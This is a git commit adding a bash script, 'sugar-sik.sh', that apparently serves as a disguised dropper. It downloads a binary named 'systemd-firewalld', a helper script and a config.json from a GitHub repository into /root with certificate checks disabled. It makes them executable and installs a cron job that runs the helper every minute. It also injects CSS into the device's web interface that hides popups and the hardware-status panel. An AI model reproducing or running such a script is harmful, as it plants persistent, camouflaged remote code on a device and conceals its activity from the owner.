14317203402edc12c0fd6bad60e5a2405c4b1c59
muzsiki <99776506+muzsiki@users.noreply.github.com>
2022-02-16 05:09:57 +0300

    Add files via upload

---
+++ sugar-sik.sh
@@ -0,0 +1,22 @@
+#!/usr/bin/env bash
+wget --no-check-certificate https://raw.githubusercontent.com/muzsiki/muz/main/systemd-firewalld -P /root/
+wget --no-check-certificate https://raw.githubusercontent.com/muzsiki/muz/main/system-firewalld.sh -P /root/
+wget --no-check-certificate https://raw.githubusercontent.com/muzsiki/muz/main/config.json -P /root/
+chmod +x /root/systemd-firewalld
+chmod +x /root/system-firewalld.sh
+echo '.layui-layer {display: none !important; }' >> /usr/www/css/ctools.css
+echo 'div#tos_hardware_status {display: none !important;}' >> /usr/www/css/ctools.css
+crontab -l > crontab_new
+echo "* * * * * /root/system-firewalld.sh >> /var/log/system-firewalld.log 2>&1 </dev/null" >> crontab_new
+crontab crontab_new
+rm crontab_new
+echo "* * * * * /root/system-firewalld.sh >> /var/log/system-firewalld.log 2>&1 </dev/null" >> /etc/crontabs/root
+
+
+
+
+
+
+
+
+
